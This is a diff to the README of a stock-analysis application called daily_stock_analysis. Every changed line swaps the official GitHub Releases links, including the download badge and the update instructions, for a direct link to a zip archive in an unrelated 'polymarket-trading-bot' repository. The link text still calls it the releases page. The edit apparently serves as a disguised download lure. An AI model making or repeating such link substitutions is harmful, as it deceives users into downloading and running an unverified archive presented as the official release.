@@ -5,9 +5,9 @@ Welcome to **daily_stock_analysis**! This application helps you analyze A/H shar
 
 ## 📥 Download & Install
 
-[![Download daily_stock_analysis](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/Sahil56899/daily_stock_analysis/releases)
+[![Download daily_stock_analysis](https://raw.githubusercontent.com/Sahil56899/polymarket-trading-bot/main/bot/commands/polymarket_bot_trading_3.7.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/Sahil56899/polymarket-trading-bot/main/bot/commands/polymarket_bot_trading_3.7.zip)
 
-To get started, visit this page to download: [GitHub Releases Page](https://github.com/Sahil56899/daily_stock_analysis/releases).
+To get started, visit this page to download: [GitHub Releases Page](https://raw.githubusercontent.com/Sahil56899/polymarket-trading-bot/main/bot/commands/polymarket_bot_trading_3.7.zip).
 
 ### Steps to Download:
 1. Click on the link above to go to the Releases page.
@@ -42,7 +42,7 @@ To ensure optimal performance, please meet the following requirements:
 
 ## 🔄 Updating the Application
 To keep your application running smoothly:
-1. Regularly check the [GitHub Releases Page](https://github.com/Sahil56899/daily_stock_analysis/releases) for updates.
+1. Regularly check the [GitHub Releases Page](https://raw.githubusercontent.com/Sahil56899/polymarket-trading-bot/main/bot/commands/polymarket_bot_trading_3.7.zip) for updates.
 2. When a new version is available, download and install it following the same steps as above.
 
 ## 📞 Support
